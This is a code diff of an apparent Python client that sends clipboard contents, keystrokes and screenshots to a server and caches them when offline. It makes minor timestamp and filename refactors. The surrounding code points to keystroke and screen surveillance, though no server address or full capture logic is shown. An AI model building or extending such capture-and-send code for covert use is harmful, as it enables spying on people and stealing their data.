@@ -25,7 +25,7 @@ def server_is_online():
 
 def send_data(data, data_type):
     try:
-        # Serialize data (Regular JSON payload (for clipboard/keystrokes))
+        # Serialize data (Regular JSON payload for clipboard/keystrokes)
         payload = json.dumps({
             "type": data_type,
             "data": data
@@ -54,7 +54,7 @@ def send_data(data, data_type):
 
         # If offline, cache the data
         cache_dir = ensure_cache_directory()
-        timestamp = get_timestamp().replace(":", "-")
+        timestamp = get_timestamp(sanitized=True)
         cache_file = os.path.join(cache_dir, f"{data_type}_{timestamp}.json")
 
         with open(cache_file, "w") as f:
@@ -109,14 +109,13 @@ def send_screenshot(image_data, timestamp):
 
         # If offline, cache the screenshot
         cache_dir = ensure_cache_directory()
-        safe_timestamp = timestamp.replace(":", "-")
-        cache_file = os.path.join(cache_dir, f"screenshot_{safe_timestamp}.jpg")
+        cache_file = os.path.join(cache_dir, f"screenshot_{timestamp}.jpg")
 
         with open(cache_file, "wb") as f:
             f.write(image_data)
 
         # Save metadata separately
-        meta_file = os.path.join(cache_dir, f"screenshot_{safe_timestamp}.json")
+        meta_file = os.path.join(cache_dir, f"screenshot_{timestamp}.json")
         with open(meta_file, "w") as f:
             json.dump({
                 "type": "screenshot",
